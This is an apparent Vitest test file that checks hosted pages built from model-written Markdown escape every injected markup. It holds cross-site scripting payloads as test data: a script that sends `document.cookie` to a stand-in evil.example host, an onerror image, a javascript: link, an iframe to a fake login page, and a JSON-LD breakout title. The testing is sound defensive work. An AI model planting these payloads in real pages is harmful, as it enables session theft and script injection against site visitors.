/** @vitest-environment jsdom */
// tests/hosted/serving/inert.test.tsx — SPEC §7 (2026-09-18), issue 888
//
// **What a published page does with markup a model wrote.** The body of a
// hosted page is model-written Markdown, rendered on the customer's own
// domain, under their name and their identity. If any of it could reach the
// served document as markup, ReachKit would be publishing script into a
// stranger's origin — and the customer would be the publisher of record for
// it.
//
// It cannot, and the reason is the renderer rather than a sanitiser:
// `src/lib/publish/render/markdown.ts` escapes every text node and emits
// only its own closed set of elements, so there is no allow-list to keep
// current and no `sanitise()` call anyone can forget. These rows assert
// that property **where it matters** — over the bytes the hosted route
// serves, not over what the helper returns, which
// `tests/publish/render/markdown.test.ts` already owns. A second renderer
// introduced anywhere on this path, or a body interpolated into the
// document around the renderer, fails here and passes there.
//
// **Each row parses the served bytes the way a browser would** and asks the
// document what is in it, rather than searching the string for a substring:
// a string search cannot tell `<script>` in the markup from `&lt;script&gt;`
// in the text, and telling those two apart is the whole question.
//
// One case per attack shape the issue names, plus the two values that do
// **not** go through the body renderer at all — the title and the
// description, which land in the head, in the `<h1>` and inside the
// `application/ld+json` block, and are model-written too.
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { applyEnvFixture } from "../../mail/env-fixture";

applyEnvFixture();

const state: { host: string; page: unknown } = { host: "content.example.com", page: null };

vi.mock("next/headers", () => ({
  headers: async () => new Headers({ host: state.host }),
}));

vi.mock("@/lib/account/billing", () => ({
  hostedServingState: async () => ({ serve: true }),
}));

vi.mock("@/lib/publish/destinations/hosted", async () => {
  const address = await import("@/lib/publish/destinations/hosted/address");
  return {
    liveUrlFor: address.liveUrlFor,
    liveUrlOnHost: address.liveUrlOnHost,
    hostedHostFor: address.hostedHostFor,
    tags: { site: (s: string) => `hosted:site:${s}`, page: (p: string) => `hosted:page:${p}` },
    hostedSiteForDomain: async (domain: string) =>
      domain === "example.com" ? { siteId: "site-1", domain, host: `content.${domain}` } : null,
    hostedSiteForHostname: async () => null,
    livePageBySlug: async () => state.page,
    livePagesForSite: async () => (state.page === null ? [] : [state.page]),
    wasEverLive: async () => false,
  };
});

const Page = (await import("@/app/(hosted)/hosted-page/[[...slug]]/page")).default;
const { generateMetadata } = await import("@/app/(hosted)/hosted-page/[[...slug]]/page");

/** One live page with a hostile body. Everything else about it is ordinary:
 *  what is under test is what the body does, not what the page is. */
function pageWith(over: Record<string, unknown>): unknown {
  return {
    publicationId: "pub-1",
    siteId: "site-1",
    slug: "a-page",
    title: "The best onboarding tools",
    bodyMd: "An ordinary paragraph.",
    description: "What teams look for in an onboarding tool.",
    faq: [],
    grounded: null,
    publisher: { name: "example.com", category: "user onboarding software", timeZone: "UTC" },
    publishedAt: new Date("2026-09-04T11:00:00.000Z"),
    liveUrl: "https://content.example.com/a-page",
    record: {
      opportunityId: "opp-1",
      targetQuery: "best onboarding tools",
      measuredOn: new Date("2026-08-28T00:00:00.000Z"),
      mode: "autopilot",
      liveUrl: "https://content.example.com/a-page",
    },
    ...over,
  };
}

async function render(): Promise<string> {
  const tree = await Page({ params: Promise.resolve({ slug: ["a-page"] }) });
  return renderToStaticMarkup(tree);
}

/** The served bytes, parsed. */
async function served(): Promise<{ html: string; doc: Document }> {
  const html = await render();
  const doc = new DOMParser().parseFromString(
    `<!doctype html><html><body>${html}</body></html>`,
    "text/html"
  );
  return { html, doc };
}

/**
 * Everything on the served page that could run, load or frame — asked of
 * the parsed document, so an escaped `<script>` in the text is correctly
 * not one of them.
 *
 * The two `application/ld+json` blocks the route composes are data and not
 * behaviour (a browser executes neither), so they are named here rather
 * than counted as a finding — and they are the only `<script>` this page is
 * permitted, which the first row below states directly.
 */
function active(doc: Document): string[] {
  const found: string[] = [];
  for (const element of Array.from(doc.querySelectorAll("*"))) {
    const tag = element.tagName.toLowerCase();
    if (tag === "script" && element.getAttribute("type") !== "application/ld+json") {
      found.push("script");
    }
    if (["iframe", "img", "object", "embed", "form", "style", "link"].includes(tag)) found.push(tag);
    for (const attribute of Array.from(element.attributes)) {
      if (attribute.name.toLowerCase().startsWith("on")) found.push(`${tag}[${attribute.name}]`);
      if (/^\s*javascript:/i.test(attribute.value)) found.push(`${tag}[${attribute.name}=javascript:]`);
    }
  }
  return found;
}

beforeEach(() => {
  state.host = "content.example.com";
  state.page = pageWith({});
});

describe("a published page is inert: nothing in a body reaches the document as markup", () => {
  it("the reading itself finds markup where there is some — these rows are not vacuous", () => {
    // Every row below asserts `active()` is empty. That assertion is worth
    // nothing unless `active()` can be non-empty, so here is the same
    // document with the markup left in.
    const doc = new DOMParser().parseFromString(
      '<!doctype html><html><body><p><script>alert(1)</script>' +
        '<img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>' +
        '<a href="javascript:alert(1)">click me</a></p></body></html>',
      "text/html"
    );
    expect(active(doc)).toEqual([
      "script",
      "img",
      "img[onerror]",
      "iframe",
      "a[href=javascript:]",
    ]);
  });

  it("a `<script>` in the body is text on the page, and no script tag on it", async () => {
    state.page = pageWith({
      bodyMd: 'Teams ask this first.\n\n<script>fetch("https://evil.example/" + document.cookie)</script>',
    });
    const { html, doc } = await served();

    expect(active(doc)).toEqual([]);
    // The only `<script>` on the page is the route's own data block.
    const scripts = Array.from(doc.querySelectorAll("script"));
    expect(scripts.map((script) => script.getAttribute("type"))).toEqual(["application/ld+json"]);
    // What a reader sees is the five characters and a word, which is what
    // a customer who typed it would expect.
    expect(html).toContain("&lt;script&gt;");
    expect(doc.body.textContent).toContain("<script>fetch(");
  });

  it("an `onerror` attribute is text, and lands on no element", async () => {
    state.page = pageWith({
      bodyMd: 'Compare the two:\n\n<img src=x onerror="alert(document.domain)">',
    });
    const { doc } = await served();

    expect(active(doc)).toEqual([]);
    expect(doc.querySelectorAll("img")).toHaveLength(0);
    expect(doc.body.textContent).toContain('<img src=x onerror="alert(document.domain)">');
  });

  it("a `javascript:` link renders its label and is not a link at all", async () => {
    state.page = pageWith({
      bodyMd: "Start with [the checklist](javascript:alert(1)) and work down.",
    });
    const { doc } = await served();

    expect(active(doc)).toEqual([]);
    // The words survive; the address does not become clickable. A closed
    // list of schemes, so a scheme nobody thought of is refused too.
    expect(doc.body.textContent).toContain("the checklist");
    expect(Array.from(doc.querySelectorAll("a")).map((a) => a.getAttribute("href"))).toEqual([]);

    // An ordinary link on the same page still is one, so the row above is
    // the scheme being refused rather than links being broken.
    state.page = pageWith({ bodyMd: "Start with [the checklist](https://example.com/list)." });
    const ordinary = await served();
    expect(
      Array.from(ordinary.doc.querySelectorAll("a")).map((a) => a.getAttribute("href"))
    ).toEqual(["https://example.com/list"]);
  });

  it("an embedded iframe is text, and no frame is served", async () => {
    state.page = pageWith({
      bodyMd: 'See for yourself.\n\n<iframe src="https://evil.example/login"></iframe>',
    });
    const { doc } = await served();

    expect(active(doc)).toEqual([]);
    expect(doc.querySelectorAll("iframe")).toHaveLength(0);
    expect(doc.body.textContent).toContain('<iframe src="https://evil.example/login">');
  });

  it("all four in one body leave one page, whole, and no markup of theirs", async () => {
    state.page = pageWith({
      bodyMd: [
        "## What to look for",
        "",
        "<script>alert(1)</script>",
        "",
        '<img src=x onerror="alert(1)">',
        "",
        "[click me](javascript:alert(1))",
        "",
        '<iframe src="https://evil.example"></iframe>',
      ].join("\n"),
    });
    const { doc } = await served();

    expect(active(doc)).toEqual([]);
    // The page still renders, whole: an inert body is not a withheld one.
    expect(doc.body.textContent).toContain("What to look for");
    expect(doc.body.textContent).toContain("The best onboarding tools");
  });
});

describe("the title and the description are model-written too, and land inert", () => {
  it("a title carrying markup is escaped in the `<h1>` and cannot close the JSON-LD block", async () => {
    state.page = pageWith({ title: "</script><script>alert(1)</script>" });
    const { html, doc } = await served();

    expect(active(doc)).toEqual([]);
    expect(doc.querySelector("h1")?.textContent).toBe("</script><script>alert(1)</script>");
    // `jsonLd` escapes the `<`, so a value cannot close the block it is in.
    expect(html).not.toContain("</script><script>alert(1)");
    expect(html).toContain("\\u003c/script>\\u003cscript>alert(1)\\u003c/script>");
  });

  it("a description carrying markup is the customer's own string, escaped where it lands", async () => {
    state.page = pageWith({ description: '"><script>alert(1)</script>' });

    // The route hands Next the string and never builds the `<meta>` itself,
    // which is what keeps the escaping the framework's one job.
    const metadata = await generateMetadata({ params: Promise.resolve({ slug: ["a-page"] }) });
    expect(metadata.description).toBe('"><script>alert(1)</script>');

    const { html, doc } = await served();
    expect(active(doc)).toEqual([]);
    expect(html).toContain('\\u003cscript>alert(1)\\u003c/script>');
  });
});
